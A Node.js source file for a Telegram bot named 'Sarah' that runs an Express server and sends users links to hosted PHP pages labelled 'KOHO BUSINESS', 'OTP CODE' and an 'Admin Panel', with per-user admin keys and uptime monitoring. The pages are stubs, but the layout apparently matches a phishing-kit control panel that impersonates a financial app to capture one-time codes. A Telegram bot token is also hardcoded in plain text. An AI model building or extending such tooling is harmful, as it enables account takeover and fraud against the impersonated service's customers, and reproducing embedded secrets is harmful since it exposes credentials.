#!/usr/bin/env node
import fs from "fs";
import path from "path";
import express from "express";
import fetch from "node-fetch";
import { fileURLToPath } from "url";
import TelegramBot from "node-telegram-bot-api";
import { exec } from "child_process";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ─── CONFIG ─────────────────────────────
const BASE = __dirname;
const DOT_WWW = path.join(BASE, ".www");
const WWW = path.join(BASE, "www");
const LOGS = path.join(BASE, ".logs");
const DATA = path.join(BASE, ".data");
const WATCHERS_FILE = path.join(DATA, "watchers.json");

const BOT_NAME = "Sarah";
const PROJECT_NAME = "PROJECT-SARAH";
const TOKEN = "8372102152:AAHb50tvjQnKQiQ_iAYkA4lFSoKwJO85NmQ"; // hardcoded for now
const PUBLIC_URL = process.env.RENDER_EXTERNAL_URL;

if (!TOKEN) throw new Error("❌ BOT_TOKEN missing");
if (!PUBLIC_URL) throw new Error("❌ RENDER_EXTERNAL_URL missing");

[LOGS, DATA, WWW, DOT_WWW].forEach(d => {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
});

const bot = new TelegramBot(TOKEN, { polling: true });

// ─── STATE ──────────────────────────────
const S = {
  started: Date.now(),
  watchers: new Set(),
  lastOnline: null,
  users: {} // chat_id -> { adminKey, panelURL }
};

// ─── UTIL ───────────────────────────────
function log(msg) {
  const line = `[${new Date().toISOString()}] ${msg}\n`;
  console.log(line.trim());
  fs.appendFileSync(path.join(LOGS, "debug.log"), line);
}

function loadWatchers() {
  if (fs.existsSync(WATCHERS_FILE)) {
    try {
      const data = JSON.parse(fs.readFileSync(WATCHERS_FILE, "utf-8"));
      S.watchers = new Set(data.watchers || []);
      S.users = data.users || {};
    } catch { S.watchers = new Set(); S.users = {}; }
  }
}

function saveWatchers() {
  fs.writeFileSync(WATCHERS_FILE, JSON.stringify({ watchers: [...S.watchers], users: S.users }, null, 2));
}

function ensureWWW() {
  if (!fs.existsSync(path.join(DOT_WWW, "splash.php"))) {
    fs.writeFileSync(path.join(DOT_WWW, "splash.php"), `<?php echo "<h1>Koho Web App</h1>"; ?>`);
  }
  if (!fs.existsSync(path.join(DOT_WWW, "blacklist.php"))) {
    fs.writeFileSync(path.join(DOT_WWW, "blacklist.php"), `<?php echo "<h1>Admin Panel</h1>"; ?>`);
  }
  fs.cpSync(DOT_WWW, WWW, { recursive: true });
}

async function httpCheck(url) {
  try {
    const r = await fetch(url, { method: "HEAD" });
    return r.ok;
  } catch { return false; }
}

// ─── EXPRESS SERVER ─────────────────────
ensureWWW();
const app = express();
app.use(express.static(WWW));

app.get("/splash.php", (req, res) => {
  res.send("<h1>Koho Web App</h1>");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => log(`Express fallback running on port ${PORT}`));

// ─── TELEGRAM UI ───────────────────────
function mainKB() {
  return {
    keyboard: [
      ["▶️ START", "📎 LINKS MENU", "⏹ STOP"],
      ["📊 STATUS", "📝 LOGS", "👁 WATCH"],
      ["❓ HELP", "⚠️ DISCLAIMER", "⚙️ SETTINGS"]
    ],
    resize_keyboard: true
  };
}

function linksPanel(base) {
  const routes = [
    ["/splash.php", "KOHO BUSINESS"],
    ["/blacklist.php", "Admin Panel"],
    ["/otp.php", "OTP CODE"]
  ];
  return {
    inline_keyboard: routes.map(([p, label]) => [{ text: label, url: `${base}${p}?src=sarah` }])
  };
}

// ─── BOT HANDLERS ─────────────────────
bot.onText(/\/start/, (m) => {
  const cid = m.chat.id;
  S.watchers.add(cid);
  if (!S.users[cid]) {
    S.users[cid] = { adminKey: Math.random().toString(36).slice(2, 10), panelURL: `${PUBLIC_URL}/blacklist.php?key=${Math.random().toString(36).slice(2,10)}` };
  }
  saveWatchers();
  bot.sendMessage(cid, `Hi, I’m ${BOT_NAME} — welcome to ${PROJECT_NAME}.\nYour admin key: ${S.users[cid].adminKey}`, { reply_markup: mainKB() });
});

bot.on("message", async (m) => {
  const cid = m.chat.id;
  const text = (m.text || "").toUpperCase();
  if (!S.watchers.has(cid)) S.watchers.add(cid);
  if (!S.users[cid]) S.users[cid] = { adminKey: Math.random().toString(36).slice(2,10), panelURL: `${PUBLIC_URL}/blacklist.php?key=${Math.random().toString(36).slice(2,10)}` };
  saveWatchers();

  // START
  if (text.includes("START")) {
    return bot.sendMessage(cid, "Your panel is ready.", { reply_markup: linksPanel(PUBLIC_URL) });
  }

  // LINKS
  if (text.includes("LINK")) {
    return bot.sendMessage(cid, "Quick access:", { reply_markup: linksPanel(PUBLIC_URL) });
  }

  // STATUS
  if (text.includes("STATUS")) {
    const ok = await httpCheck(PUBLIC_URL + "/splash.php");
    const up = Math.floor((Date.now() - S.started) / 1000);
    return bot.sendMessage(cid, `${ok ? "🟢 Online" : "🔴 Offline"}\nUptime: ${up}s\nPanel: ${S.users[cid].panelURL}`, { reply_markup: mainKB() });
  }

  // LOGS
  if (text.includes("LOG")) {
    const logData = fs.existsSync(path.join(LOGS, "debug.log")) ? fs.readFileSync(path.join(LOGS, "debug.log"), "utf8").slice(-1800) : "No logs";
    return bot.sendMessage(cid, `\`\`\`\n${logData}\n\`\`\``, { parse_mode: "Markdown" });
  }

  // WATCH toggle
  if (text.includes("WATCH")) {
    if (S.watchers.has(cid)) {
      S.watchers.delete(cid);
      bot.sendMessage(cid, "Watch disabled");
    } else {
      S.watchers.add(cid);
      bot.sendMessage(cid, "Watch enabled");
    }
    saveWatchers();
    return;
  }

  // HELP
  if (text.includes("HELP")) {
    return bot.sendMessage(cid, "Commands:\n▶️ START\n📎 LINKS MENU\n📊 STATUS\n👁 WATCH\n📝 LOGS", { reply_markup: mainKB() });
  }

  bot.sendMessage(cid, "Try START or STATUS", { reply_markup: mainKB() });
});

// ─── MONITOR ───────────────────────────
setInterval(async () => {
  if (!S.watchers.size) return;
  const ok = await httpCheck(PUBLIC_URL + "/splash.php");
  if (S.lastOnline === null) S.lastOnline = ok;
  if (ok !== S.lastOnline) {
    S.lastOnline = ok;
    for (const id of S.watchers) {
      bot.sendMessage(id, ok ? "✅ Back online" : "⚠️ Went offline");
    }
  }
}, 10000);

loadWatchers();
log("Massive multi-user PHP manager + Telegram bot online.");